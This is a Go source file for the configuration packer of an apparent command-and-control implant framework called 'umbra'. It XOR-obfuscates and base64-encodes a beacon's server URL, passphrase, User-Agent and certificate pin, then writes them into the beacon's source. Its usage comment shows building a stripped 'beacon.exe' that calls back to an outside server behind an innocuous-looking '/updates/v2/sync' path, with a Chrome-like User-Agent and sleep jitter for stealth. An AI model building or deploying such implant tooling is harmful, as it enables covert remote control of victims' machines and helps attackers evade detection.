// Command pack generates the beacon's compiled-in configuration. It XOR-masks
// each value with cfgMask and base64-encodes it, then rewrites
// cmd/beacon/config.go. Run it from the umbra module root, then build the
// beacon. The mask constant here MUST match cfgMask in cmd/beacon/obfuscate.go.
//
// Example:
//
//	go run ./cmd/pack \
//	    -server https://192.0.2.40:8443/updates/v2/sync \
//	    -pass 'my-shared-secret' -sleep 30 -jitter 25 -pin <cert-sha256>
//	go build -ldflags "-s -w" -o beacon.exe ./cmd/beacon
package main

import (
	"encoding/base64"
	"flag"
	"fmt"
	"os"
	"strings"
)

// packMask must equal cfgMask in cmd/beacon/obfuscate.go.
const packMask = "umbra::c2::2026::mask"

// mask XORs s with packMask and base64-encodes the result.
func mask(s string) string {
	if s == "" {
		return ""
	}
	b := []byte(s)
	for i := range b {
		b[i] ^= packMask[i%len(packMask)]
	}
	return base64.StdEncoding.EncodeToString(b)
}

func main() {
	server := flag.String("server", "", "beacon endpoint URL, e.g. https://192.0.2.40:8443/updates/v2/sync")
	pass := flag.String("pass", "", "shared passphrase (must match the server -pass)")
	ua := flag.String("ua", "", "User-Agent the beacon sends (default: Chrome-like)")
	pin := flag.String("pin", "", "lowercase hex SHA-256 of the server leaf cert (optional)")
	sleep := flag.Int("sleep", 5, "base sleep seconds")
	jitter := flag.Int("jitter", 20, "sleep jitter percentage (0-100)")
	out := flag.String("out", "cmd/beacon/config.go", "path to the config.go to rewrite")
	flag.Parse()

	if *server == "" || *pass == "" {
		fmt.Fprintln(os.Stderr, "usage: pack -server <url> -pass <secret> [-ua <ua>] [-pin <hex>] [-sleep N] [-jitter N] [-out path]")
		os.Exit(2)
	}
	if *jitter < 0 || *jitter > 100 {
		fmt.Fprintln(os.Stderr, "[-] jitter must be 0-100")
		os.Exit(2)
	}

	src := fmt.Sprintf(`package main

// This file is generated by cmd/pack. Do not edit by hand: re-run the packer so
// the mask in obfuscate.go stays in sync. Values are base64(XOR(value, cfgMask)).
var (
	cfgServerB64 = %q
	cfgPassB64   = %q
	cfgUAB64     = %q
	cfgPinB64    = %q
)

const (
	cfgSleepSecs = %d
	cfgJitterPct = %d
)
`, mask(*server), mask(*pass), mask(*ua), mask(strings.ToLower(strings.TrimSpace(*pin))), *sleep, *jitter)

	if err := os.WriteFile(*out, []byte(src), 0o644); err != nil {
		fmt.Fprintln(os.Stderr, "[-] write:", err)
		os.Exit(1)
	}

	fmt.Printf("[+] wrote %s\n", *out)
	fmt.Printf("    server : %s\n", *server)
	fmt.Printf("    sleep  : %ds  jitter: %d%%\n", *sleep, *jitter)
	if *pin != "" {
		fmt.Printf("    pinned : %s\n", strings.ToLower(*pin))
	}
	fmt.Println("    next   : go build -ldflags \"-s -w\" -o beacon.exe ./cmd/beacon")
}
